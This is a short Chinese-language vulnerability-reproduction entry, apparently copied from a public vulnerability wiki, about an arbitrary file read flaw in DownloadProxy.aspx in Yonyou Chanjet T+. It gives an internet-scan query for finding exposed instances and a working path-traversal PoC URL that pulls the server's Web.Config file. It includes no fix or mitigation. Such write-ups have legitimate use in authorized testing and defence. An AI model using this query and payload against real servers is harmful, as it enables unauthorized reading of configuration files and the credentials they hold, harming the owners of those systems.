---
title: "用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞"
date: 2026-10-16 09:11:12
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "用友"
tags:
  - "用友"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 漏洞影响

```
用友 畅捷通T+
```

## 网络测绘

```
app="畅捷通-TPlus"
```

## 漏洞复现

登录页面

![image-20220909104559292](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202209091045361.png)

验证POC

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

![image-20220909104628456](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202209091046535.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9AT%2B-DownloadProxy.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
